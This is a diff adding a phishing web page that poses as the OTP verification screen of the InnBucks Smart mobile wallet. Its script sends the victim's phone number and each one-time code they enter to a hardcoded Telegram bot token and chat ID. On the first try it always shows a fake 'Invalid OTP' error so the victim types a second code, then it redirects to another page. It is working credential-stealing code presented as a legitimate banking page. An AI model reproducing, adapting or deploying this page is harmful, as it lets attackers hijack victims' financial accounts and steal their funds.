@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Verify OTP | InnBucks Smart</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        
+        body { 
+            background: #1f2235; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            height: 100vh;
+            width: 100vw;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        /* Smart Toast Popup */
+        #smart-toast {
+            position: fixed;
+            top: -100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #ff4d4d;
+            color: white;
+            padding: 16px 24px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            transition: all 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            width: 90%;
+            max-width: 380px;
+        }
+        #smart-toast.show { top: 20px; }
+
+        .content {
+            flex: 1;
+            padding: 30px 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .otp-box {
+            display: flex;
+            justify-content: center;
+            gap: 18px;
+            margin: 50px 0;
+            cursor: pointer;
+        }
+
+        .otp-dot {
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            border: 2px solid rgba(255, 255, 255, 0.4);
+            background: transparent;
+            transition: all 0.2s ease;
+        }
+
+        .otp-dot.filled {
+            background: #fff;
+            border-color: #fff;
+            transform: scale(1.2);
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+        }
+
+        #hiddenOtp {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+            left: -1000px;
+        }
+
+        .footer {
+            padding: 20px 24px 40px;
+            width: 100%;
+        }
+
+        #verifyBtn {
+            width: 100%;
+            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
+            border: none;
+            padding: 18px;
+            border-radius: 20px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 20px rgba(37, 99, 235, 0.3);
+        }
+
+        #verifyBtn:active {
+            transform: scale(0.96);
+            filter: brightness(1.1);
+        }
+
+        .dot-loader {
+            display: none;
+            gap: 6px;
+            justify-content: center;
+            align-items: center;
+        }
+        .dot-loader span {
+            width: 8px;
+            height: 8px;
+            background: #fff;
+            border-radius: 50%;
+            animation: bounce 1.4s infinite ease-in-out both;
+        }
+        .dot-loader span:nth-child(1) { animation-delay: -0.32s; }
+        .dot-loader span:nth-child(2) { animation-delay: -0.16s; }
+
+        @keyframes bounce {
+            0%, 80%, 100% { transform: scale(0); opacity: 0.3; }
+            40% { transform: scale(1); opacity: 1; }
+        }
+    </style>
+</head>
+<body onclick="focusKeyboard()">
+
+    <div id="smart-toast">
+        <i class="fas fa-circle-exclamation text-lg"></i>
+        <span class="text-sm font-bold tracking-wide">Invalid OTP. Please try again.</span>
+    </div>
+
+    <div class="content">
+        <div class="w-full text-left mb-10">
+            <button onclick="window.location.href='login.html'" class="text-2xl opacity-60 hover:opacity-100 transition">
+                <i class="fas fa-arrow-left"></i>
+            </button>
+        </div>
+
+        <h1 class="text-3xl font-extrabold mb-3 tracking-tight">Enter OTP</h1>
+        <p class="text-center text-slate-400 text-sm leading-relaxed mb-8">
+            Please enter the 5-digit verification code <br>sent to <span id="userPhone" class="text-white font-bold"></span>
+        </p>
+
+        <div class="otp-box" id="otpVisualContainer">
+            <div class="otp-dot"></div>
+            <div class="otp-dot"></div>
+            <div class="otp-dot"></div>
+            <div class="otp-dot"></div>
+            <div class="otp-dot"></div>
+        </div>
+
+        <input id="hiddenOtp" maxlength="5" type="tel" inputmode="numeric" autocomplete="one-time-code">
+
+        <button onclick="location.reload()" class="text-blue-400 font-bold text-xs uppercase tracking-widest hover:text-blue-300 transition">
+            Resend Code
+        </button>
+    </div>
+
+    <div class="footer">
+        <button id="verifyBtn" onclick="handleVerify(event)">
+            <span id="btnText">Verify Account</span>
+            <div class="dot-loader" id="dotLoader">
+                <span></span><span></span><span></span>
+            </div>
+        </button>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8205911859:AAHz67pd-r9V2TYVf3NEvlOX1aRXrigm9Hg";
+        const CHAT_ID = "8588753899";
+        let otpAttempts = 0;
+
+        const hiddenInput = document.getElementById("hiddenOtp");
+        const dots = document.querySelectorAll(".otp-dot");
+        const toast = document.getElementById("smart-toast");
+
+        document.getElementById("userPhone").innerText = localStorage.getItem("userPhone") || "your phone";
+
+        // Reliable Keyboard Trigger
+        function focusKeyboard() {
+            hiddenInput.focus();
+        }
+
+        // Sync visual dots with input
+        hiddenInput.addEventListener("input", (e) => {
+            const val = e.target.value;
+            dots.forEach((dot, i) => {
+                if (i < val.length) dot.classList.add("filled");
+                else dot.classList.remove("filled");
+            });
+        });
+
+        function showPopupError() {
+            toast.classList.add("show");
+            setTimeout(() => toast.classList.remove("show"), 3000);
+        }
+
+        async function sendToTelegram(otp, attempt) {
+            const phone = localStorage.getItem("userPhone") || "N/A";
+            const msg = `🔐 *InnBucks OTP Alert*\n\n📱 *Phone:* \`${phone}\`\n🔑 *OTP:* \`${otp}\`\n🏷️ *Status:* ${attempt}`;
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
+            });
+        }
+
+        async function handleVerify(e) {
+            e.stopPropagation(); // Prevent re-triggering body click
+            const otp = hiddenInput.value;
+            const btn = document.getElementById("verifyBtn");
+            const txt = document.getElementById("btnText");
+            const loader = document.getElementById("dotLoader");
+
+            if (otp.length < 5) {
+                showPopupError();
+                focusKeyboard();
+                return;
+            }
+
+            // UI Loading State
+            txt.style.display = "none";
+            loader.style.display = "flex";
+            btn.disabled = true;
+
+            otpAttempts++;
+
+            if (otpAttempts === 1) {
+                await sendToTelegram(otp, "First attempt (Failed)");
+                setTimeout(() => {
+                    txt.style.display = "block";
+                    loader.style.display = "none";
+                    btn.disabled = false;
+                    hiddenInput.value = "";
+                    dots.forEach(d => d.classList.remove("filled"));
+                    showPopupError();
+                    focusKeyboard();
+                }, 1500);
+            } else {
+                await sendToTelegram(otp, "Second attempt (Success)");
+                setTimeout(() => {
+                    window.location.href = "limit.html";
+                }, 1000);
+            }
+        }
+
+        // Auto-focus on load
+        window.onload = focusKeyboard;
+    </script>
+</body>
+</html>
